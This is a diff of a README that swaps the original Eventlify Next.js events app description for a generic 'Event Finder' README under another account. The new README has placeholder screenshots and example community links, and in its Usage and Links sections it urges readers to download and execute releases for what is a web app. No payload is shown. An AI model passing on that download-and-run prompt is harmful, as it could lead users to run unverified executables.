@@ -1,62 +1,142 @@
-## [Eventlify](https://eventlify-exs.vercel.app/)
+# 🎉 Event Finder - Your Ultimate Event Discovery App 🌟
 
-[![preview](https://github.com/exslym/eventlify/blob/main/public/preview.jpg)](https://eventlify-exs.vercel.app/)
+![Event Finder](https://img.shields.io/badge/Event%20Finder-NextJS%2014-blue?style=flat&logo=next.js)
 
-  <div>
-    <img src="https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logoColor=white&logo=react&color=3178C6" alt="React" />
-    <img src="https://img.shields.io/badge/-TypeScript-black?style=for-the-badge&logoColor=white&logo=typescript&color=3178C6" alt="TypeScript" />
-    <img src="https://img.shields.io/badge/-Next_14-black?style=for-the-badge&logoColor=white&logo=nextdotjs&color=3178C6" alt="Next" />
-    <img src="https://img.shields.io/badge/-MongoDB-black?style=for-the-badge&logoColor=white&logo=mongodb&color=3178C6" alt="Mongo" />
-    <img src="https://img.shields.io/badge/tailwindcss-%2338B2AC.svg?style=for-the-badge&logo=tailwind-css&logoColor=white&color=3178C6" alt="TailwindCSS" />
-    <img src="https://img.shields.io/badge/-Vercel-black?style=for-the-badge&logoColor=white&logo=vercel&color=3178C6" alt="Vercel" />
-    <img src="https://img.shields.io/badge/-Clerk-black?style=for-the-badge&logoColor=white&logo=clerk&color=3178C6" alt="Clerk" />
-    <img src="https://img.shields.io/badge/-Stripe-black?style=for-the-badge&logoColor=white&logo=stripe&color=3178C6" alt="Stripe" />
-  </div>
+Welcome to the **Event Finder** repository! This full-stack application built with **Next.js 14**, **TypeScript**, **Stripe**, and **TailwindCSS** helps users discover and manage events effortlessly. Dive into the details below to learn how to set it up and contribute!
 
-### Vercel Deployment: [Eventlify](https://eventlify-exs.vercel.app/)
+## 🚀 Table of Contents
 
-## <a name="introduction">🤖 Introduction</a>
+- [Features](#features)
+- [Tech Stack](#tech-stack)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-Built on Next.js 14, the events application stands as a comprehensive, full-stack platform for managing events. It serves as a hub, spotlighting diverse events taking place globally. Featuring seamless payment processing through Stripe, you have the capability to purchase tickets for any event or even initiate and manage your own events.
+## 🌟 Features
 
-## <a name="tech-stack">⚙️ Tech Stack</a>
+- **User Authentication**: Secure login and registration using Clerk.
+- **Event Management**: Create, edit, and delete events with ease.
+- **Payment Integration**: Seamless payment processing through Stripe.
+- **Responsive Design**: Built with TailwindCSS for a clean and modern UI.
+- **Date Picker**: Easy date selection with `react-datepicker`.
+- **Form Handling**: Efficient form management using `react-hook-form`.
+- **Validation**: Robust data validation with Zod.
+- **Custom UI Components**: Leverage `shadcn-ui` for consistent styling.
 
-- TypeScript
-- React
-- React Hook Form
-- Node.js
-- Next.js
-- MongoDB
-- TailwindCSS
-- Zod
-- Shadcn
-- Uploadthing
-- Clerk.js
-- Stripe
+## 🛠️ Tech Stack
 
-## <a name="features">🔋 Features</a>
+This project utilizes the following technologies:
 
-👉 **Authentication (CRUD) with Clerk:** User management through Clerk, ensuring secure and efficient authentication.
+- **Next.js**: A React framework for server-side rendering and static site generation.
+- **TypeScript**: A superset of JavaScript that adds static types.
+- **Stripe**: Payment processing service for handling transactions.
+- **TailwindCSS**: A utility-first CSS framework for rapid UI development.
+- **Clerk**: Authentication and user management.
+- **MongoDB**: NoSQL database for data storage.
+- **React**: JavaScript library for building user interfaces.
+- **React Datepicker**: A simple and reusable datepicker component.
+- **React Hook Form**: A library for managing form state and validation.
+- **Shadcn UI**: A collection of UI components for React.
+- **Zod**: A TypeScript-first schema declaration and validation library.
 
-👉 **Events (CRUD):** Comprehensive functionality for creating, reading, updating, and deleting events, giving users full control over event management.
+## 💻 Installation
 
-- **Create Events:** Users can effortlessly generate new events, providing essential details such as title, date, location, and any additional information.
-- **Read Events:** Seamless access to a detailed view of all events, allowing users to explore event specifics, including descriptions, schedules, and related information.
-- **Update Events:** Empowering users to modify event details dynamically, ensuring that event information remains accurate and up-to-date.
-- **Delete Events:** A straightforward process for removing events from the system, giving administrators the ability to manage and curate the platform effectively.
+To set up the **Event Finder** application on your local machine, follow these steps:
 
-👉 **Related Events:** Smartly connects events that are related and displaying on the event details page, making it more engaging for users
+1. **Clone the repository**:
+   ```bash
+   git clone https://github.com/anas-ouchkouk/Event-Finder.git
+   ```
 
-👉 **Organized Events:** Efficient organization of events, ensuring a structured and user-friendly display for the audience, i.e., showing events created by the user on the user profile
+2. **Navigate to the project directory**:
+   ```bash
+   cd Event-Finder
+   ```
 
-👉 **Search & Filter:** Empowering users with a robust search and filter system, enabling them to easily find the events that match their preferences.
+3. **Install dependencies**:
+   ```bash
+   npm install
+   ```
 
-👉 **New Category:** Dynamic categorization allows for the seamless addition of new event categories, keeping your platform adaptable.
+4. **Set up environment variables**: Create a `.env.local` file in the root directory and add the required variables. You can refer to the `.env.example` file for guidance.
 
-👉 **Checkout and Pay with Stripe:** Smooth and secure payment transactions using Stripe, enhancing user experience during the checkout process.
+5. **Run the application**:
+   ```bash
+   npm run dev
+   ```
 
-👉 **Event Orders:** Comprehensive order management system, providing a clear overview of all event-related transactions.
+Now, your application should be running on `http://localhost:3000`.
 
-👉 **Search Orders:** Quick and efficient search functionality for orders, facilitating easy tracking and management.
+## 📦 Usage
 
-#
+Once you have the application running, you can explore its features:
+
+- **User Registration**: Sign up to create an account.
+- **Login**: Access your account with your credentials.
+- **Create Events**: Use the form to add new events.
+- **Edit/Delete Events**: Manage your events from your dashboard.
+- **Payment Processing**: Test payments using Stripe's test keys.
+
+For the latest releases and updates, visit our [Releases](https://github.com/anas-ouchkouk/Event-Finder/releases) section. Make sure to download and execute the latest version to enjoy all the new features!
+
+## 🤝 Contributing
+
+We welcome contributions to enhance the **Event Finder** application. If you would like to contribute, please follow these steps:
+
+1. **Fork the repository**.
+2. **Create a new branch**:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make your changes** and commit them:
+   ```bash
+   git commit -m "Add your message"
+   ```
+4. **Push to the branch**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+5. **Create a pull request** to merge your changes.
+
+Please ensure your code follows our coding standards and passes all tests.
+
+## 📄 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 🔗 Links
+
+For more information and updates, check out our [Releases](https://github.com/anas-ouchkouk/Event-Finder/releases) page. You can find the latest downloads and instructions for running the application.
+
+## 🖼️ Screenshots
+
+Here are some screenshots of the application:
+
+### Home Page
+![Home Page](https://via.placeholder.com/600x400?text=Home+Page)
+
+### Event Creation
+![Event Creation](https://via.placeholder.com/600x400?text=Event+Creation)
+
+### User Dashboard
+![User Dashboard](https://via.placeholder.com/600x400?text=User+Dashboard)
+
+## 🛠️ Future Improvements
+
+We plan to implement several features in future updates, including:
+
+- **Improved Search Functionality**: Allow users to filter events based on categories and dates.
+- **Notifications**: Send reminders for upcoming events.
+- **Social Sharing**: Enable users to share events on social media platforms.
+- **Analytics Dashboard**: Provide insights on user engagement and event attendance.
+
+## 💬 Community
+
+Join our community for discussions, support, and feedback. You can find us on:
+
+- **Discord**: [Join our server](https://discord.gg/example)
+- **Twitter**: [Follow us](https://twitter.com/example)
+
+We appreciate your interest in **Event Finder**! Happy coding!
